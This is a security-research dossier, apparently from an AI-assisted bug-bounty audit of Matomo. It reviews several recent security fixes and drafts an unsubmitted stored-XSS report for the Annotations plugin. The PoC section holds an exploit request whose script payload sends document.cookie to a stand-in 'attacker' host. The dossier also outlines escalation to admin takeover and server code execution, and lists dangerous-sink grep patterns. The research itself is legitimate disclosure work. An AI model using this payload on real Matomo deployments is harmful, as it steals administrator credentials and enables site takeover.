# Matomo OSS audit dossier (reverse-audit campaign, 2026-08-08)

Program: H1 `/matomo` — open bounty, $100 min, ~332 resolved, open scope
("our product or service" — matomo.org + matomo-org GitHub repos).
Repo: `C:\Users\HP\matomo-audit\matomo` (shallow depth 50, 165MB,
13,592 files, 3,482 PHP). Nightly cron (`oss-nightly-audit`, job
edbb13a732d9) covers this repo alongside Vercel.

## STATUS (2026-08-08, end of session)
- HIGH stored-XSS finding (Annotations, below) is CONFIRMED in code and
  report-DRAFTED: `C:\Users\HP\recon\matomo_xss_report.md` (H1-ready
  title/summary/repro/root-cause/impact/fix). NOT submitted — human
  review + duplicate check at submission time.
- Duplicate screen DONE (method in SKILL §10.15): GitHub Advisories API
  `?affects=matomo-org/matomo` → 0 published advisories (no GHSA/CVE for
  the class); program hacktivity shows bounties $222/$333/$555/$777/
  $1,333/$1,777 all resolved within the last 10 days = LIVE payer;
  compact hacktivity view hides report titles from logged-out viewers
  (all aria-labels empty) → private-dup risk is the one uncheckable
  residual (priced ~40%→ odds ~60-65%). FAQ "annotation" mentions are
  MCP/AI prompt-injection guidance, not a prior vuln.
- GLM channels were DOWN at finding time (Puter daily quota exhausted
  "No usage left", NIM gateway axum "Missing request extension:
  Authorization") — the find came from solo code analysis; deep-GLM
  verification pass queued for when quota resets (user declined the
  new-account login).

## Reverse-audit of this week's security commits (all held Aug 5-7, 2026)

### 1. e82d3fc — TwoFactorAuth: validate preconditions in login-only setup — FIX COMPLETE
Added 4 checks to `onLoginSetupTwoFactorAuth()`: checkCanUseTwoFa,
checkCurrentUserMatchesSessionUser, check2FaIsRequired, check2FaNotEnabled.
Full controller audit (plugins/TwoFactorAuth/Controller.php):
- disableTwoFactorAuth (L150): checkCanUseTwoFa + check2FaEnabled +
  checkVerified2FA + requirePasswordVerifiedRecently + Nonce — STRONG
- setupTwoFactorAuth (L204): password verify (non-standalone) + authCode +
  AUTH_CODE_NONCE + 15-min session secret — STRONG
- showRecoveryCodes (L306): checkVerified2FA + check2FaEnabled + password
  verify + REGENERATE nonce — STRONG
No missing-check action found. Do not re-walk.

### 2. 45a2770 — SSRF-safe HTTP fetch opt-in — FIX COMPLETE
New `core/Http/EgressHostValidator.php` + safe path in `core/Http.php`:
- EXTRA_BLOCKED_RANGES: CGNAT 100.64/10, 192.0.0.0/24, TEST-NETs,
  198.18/15, multicast, ::/96, 2002::/16 (6to4), 2001::/32 (Teredo),
  64:ff9b::/96 (NAT64), fe00::/8 (covers deprecated fec0 site-local) —
  sound coverage; filter_var NO_PRIV/NO_RES handles the rest
- IPv4-mapped IPv6 unwrap via inet_pton binary check (PHP <8.1 gap)
- numeric/hex/octal-with-dots host rejection (`^0x[0-9a-f]+$`,
  `^[0-9.]+$`) — closes inet_aton literals
- Pin via `CURLOPT_RESOLVE` (host:port:ip) — curl cannot re-resolve;
  CURLOPT_FOLLOWLOCATION=false + manual per-hop redirect revalidation;
  CURLOPT_PROXY='' (env-proxy bypass closed); proxy config rejected;
  only curl transport allowed
- Opt-in: only SiteContentDetector passes validateEgressIp=true (site's
  own admin-set URL). Other variable-URL call sites are NON-attacker-
  controlled (PageSpeedCheck = admin PiwikUrl config; Intl/GeoIP/Updater
  = fixed CDN URLs). No incomplete-patch surface found.

### 3. 9adeb65 — Overlay: JS-encode handshake params in inline scripts — FIX COMPLETE
`|e('js')` added to idSite/period/rawDate/segment in
plugins/Overlay/templates/index.twig + index_noframe.twig.
Same-class hunt: plugins/Morpheus/templates/_jsGlobalVariables.twig has
`piwik.language = "{{ language }}"` / `piwik.idSite = "{{ idSite }}"`
UNESCAPED in inline JS — traced the input: saveLanguage()
(plugins/LanguagesManager/Controller.php L25) takes `language` raw from
request, but setLanguageForSession() validates with
`isLanguageAvailable()` = non-empty + isValidFilename + strict in_array
against available codes → INJECTION DEFUSED. idSite is cast int
upstream. Do not re-walk.

### 4. b806167 — Exclude token_auth/token from tracked URLs — INCOMPLETE (CANDIDATE)
Fix = added `token_auth,token` to `[Tracker]
url_query_parameter_to_exclude_from_url` in config/global.ini.php.
The exclusion list is applied in exactly ONE place:
`core/Tracker/PageUrl.php:119` (tracked page URL cleaning).
The REFERRER URL (`urlref` param, `core/Tracker/Request.php:397` —
type 'string', no cleaning) is stored RAW. ReferrerSpamFilter only
checks spam hostnames. CANDIDATE (conditional/low): admin's token_auth
in a page URL (API/widget/embed links) that appears as a referrer on a
tracked site → stored in visit referrer data → readable by view-access
users in referrers reports → token_auth = full API access (privilege-
escalation chain). Trigger requires the admin to navigate from a token-
bearing URL to a tracked page (uncommon pattern). File:line evidence
ready; severity honest = low/conditional; NOT yet verified that the
referrers report surfaces the raw URL to view users — nightly cron is
queued to verify/refute this before any report.

## ★ STORED XSS — Annotations plugin (HIGH, first confirmed High of the campaign, 2026-08-08)
Found by the deeper dig AFTER the 4-commit reverse-audit: the fresh
commits were clean, so the sweep widened to the sink+authz+CSP chain.

CHAIN (all file:line verified in the repo clone):
1. SINK: `plugins/Annotations/templates/_annotation.twig:32`
   `{{ annotation.note|raw }}` (display span) AND `:39`
   `value="{{ annotation.note|raw }}"` (edit input) — NO escaping.
2. STORAGE: `plugins/Annotations/API.php:324` `filterNote()` = 255-char
   truncation ONLY (no strip_tags/escaping — truncation-only is the
   signature of a FAILED XSS mitigation attempt); `Model.php:33`
   `createAnnotation()` = direct parameterized DB insert (raw bytes).
3. WRITE AUTHZ: `API.php:300` `checkUserCanAddNotesFor()` = any user
   with VIEW access (anonymous excluded). `save()` uses same filterNote.
4. READ AUTHZ: `API.php:167` `get()` = `checkUserHasViewAccess($idSite)`
   only; `Controller.php:63-69` `getAnnotationManager` renders ALL site
   annotations to any viewer (dashboard/annotations manager/visitor log).
5. CSP: `core/View/SecurityPolicy.php:23`
   `RULE_DEFAULT = "'self' 'unsafe-inline' 'unsafe-eval'"`; `:127`
   `script-src = RULE_DEFAULT`; csp_enabled=1, report_only=0 → inline
   <script> EXECUTES. No CSP bypass needed.
6. IMPACT: view-access user posts annotation with payload → admin
   viewing the site's annotations executes it → exfiltrate admin
   token_auth (document.cookie / page state) → full Matomo takeover;
   admin can upload plugins → RCE on the server. Stored-XSS priv-esc
   chain, view → admin → RCE.

POC (deterministic from code; no local PHP needed):
1. Login as any view-access user (self-registered works on Matomo Cloud).
2. POST /index.php?module=API&method=Annotations.add&idSite=1&date=today
   &note=%3Cscript%3Efetch('//attacker/x?c='%2Bdocument.cookie)%3C/script%3E
   (session cookie or the user's OWN token_auth — both accepted by the
   API, Request.php:431-445).
3. Admin opens the site annotations manager / dashboard → payload runs
   in the admin session.

HISTORY/DUPLICATE RISK: `|raw` pattern is OLD (present ≥ 50 commits);
truncation-only filterNote is old too — UNPATCHED in current release, so
valid to report unless previously reported (run the duplicate check
before/at submission; H1 handles dups). Git check:
`git log --oneline -5 -L 324,336:plugins/Annotations/API.php`.

## Method that found it (reusable for PHP/OSS codebases)
1. FRESH-COMMIT reverse-audit first (§4 candidates above). When all
   fixes hold, widen the sweep — don't stop at the commits.
2. AUTHZ-SCAN HEURISTIC for API surfaces: regex every `plugins/*/API.php`
   for `public function (\w+)\(`, take the first ~600 chars of body,
   flag methods with NO `checkUserHas|checkUserIs|Access::...->check`
   match. ~144 flagged on Matomo; most are metadata/dimension getters or
   use CUSTOM check methods (`checkUserCanAddNotesFor` — a name the
   heuristic misses) — triage by hand, check custom `check*` calls, don't
   trust the raw list either way.
3. DANGEROUS-SINK SWEEP (web-reachable only): `unserialize(`, `shell_exec(`,
   `system(`, `popen(`, `eval(`, `preg_replace(...,'/<...e'`, dynamic
   include/require. Matomo results: CLI-only shell_exec with constants,
   `safe_unserialize` with `allowed_classes=false` everywhere → clean.
4. STORED-XSS-IN-CODE VERIFICATION CHAIN (the order that pays): sink
   (unescaped output — grep `|raw` / inline `<script>` with template
   vars) → storage sanitization (truncation-only = failed mitigation) →
   WRITE authz (view-access = attacker bar) → READ authz (any viewer
   incl. admins = victim bar) → CSP (check the actual policy constants,
   not the header — `'unsafe-inline'` = inline scripts execute) → git
   history (old pattern = duplicate-risk flag, not a blocker).
5. TWIG inline-script sweep: python regex over `**/*.twig` for
   `<script>...</script>` blocks; template vars inside WITHOUT `|e('js')`
   = candidates (found 5 in Matomo; traced all to defused/validated
   inputs except the Annotations sink, which is in an attribute/span,
   not a script block — ALSO grep plain `{{ x|raw }}` outputs).
6. CSP values to remember for Matomo-family: `RULE_DEFAULT =
   "'self' 'unsafe-inline' 'unsafe-eval'"`, img-src adds `data:`,
   embedded-frame adds `https: http:` — inline script XSS needs NO bypass.

## Verified-clean (do not re-walk)
- TwoFactorAuth controller (all actions)
- EgressHostValidator + Http.php SSRF-safe path
- saveLanguage language-injection chain (defused by strict validation)
- token_auth tracked-URL exclusion (PageUrl applies it)
- fetchRemoteFile call sites (fixed URLs)
- CustomDimensions _actionTooltip `dimension|raw` (name = admin-set
  config, value = escaped) — safe
- MobileMessaging/SMSReport rowMetrics (email/SMS client impact weak) — safe

## Method note
Matomo ships AGENTS.md + matomo-agent-skills (security rules, twig
escaping rules) — the team runs AI-assisted development with security
review, so expect high-quality fixes; hunt the INCOMPLETE-FIX pattern
(fixes that cover one sink while siblings remain), not naive bugs.
PHP codebase: `grep -rnE "file_get_contents\(\s*\$|curl_init\(\s*\$"`
for fetch sinks; `grep -rn "<script" --include="*.twig"` for inline-JS
sinks; request-parsing sinks via `Common::getRequestVar`.
